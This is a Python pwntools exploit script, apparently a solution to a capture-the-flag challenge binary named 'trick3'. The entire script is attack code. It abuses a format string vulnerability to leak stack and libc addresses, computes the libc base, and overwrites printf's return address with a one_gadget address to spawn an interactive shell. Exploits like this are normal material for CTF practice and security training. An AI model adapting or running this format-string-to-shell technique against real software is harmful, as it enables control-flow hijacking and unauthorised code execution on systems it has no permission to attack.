#!/usr/bin/python 
from pwn import *
from koharin import *

p = process("./trick3")
elf = ELF("./trick3")
libc = elf.libc


def fsb(data):
    p.sendlineafter("> ", '3')
    p.sendafter("> ", data)

one_gadget_offset = get_oneshot('l')

pay = ''
pay += '%43$p%40$p'

fsb(pay)

leak = int(p.recv(14), 16)
libcBase = leak - libc.symbols['__libc_start_main'] - 240
one_gadget = libcBase + one_gadget_offset[3]

leak = int(p.recv(14), 16)
printf_ret = leak - 0x208

pay = fsb64(8, printf_ret, one_gadget)
fsb(pay)

p.interactive()
